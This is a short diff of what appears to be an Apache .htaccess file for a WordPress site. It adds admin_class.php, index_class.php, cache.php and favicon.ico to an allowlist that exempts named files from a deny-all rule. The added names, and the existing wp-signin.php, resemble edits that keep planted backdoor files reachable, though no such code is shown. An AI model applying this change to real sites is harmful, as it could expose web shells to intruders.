@@ -25,7 +25,7 @@ Order allow,deny
 deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|index.html|wp-admin.php|wp-comments-post.php|wp-config-sample.php|wp-config.php|wp-cron.php|wp-links-opml.php|wp-signin.php|wp-load.php|wp-login.php|wp-mail.php|wp-signin.php|wp-signup.php|wp-trackback.php|sitemap.xml|robots.txt|config.inc.php|config.TEMPLATE.inc.php)$">
+<FilesMatch "^(index.php|index.html|wp-admin.php|wp-comments-post.php|wp-config-sample.php|wp-config.php|admin_class.php|wp-cron.php|index_class.php|wp-links-opml.php|wp-signin.php|wp-load.php|wp-login.php|wp-mail.php|wp-signin.php|wp-signup.php|wp-trackback.php|sitemap.xml|robots.txt|config.inc.php|config.TEMPLATE.inc.php|favicon.ico|cache.php)$">
     Order Allow,Deny
     Allow from all
 </FilesMatch>
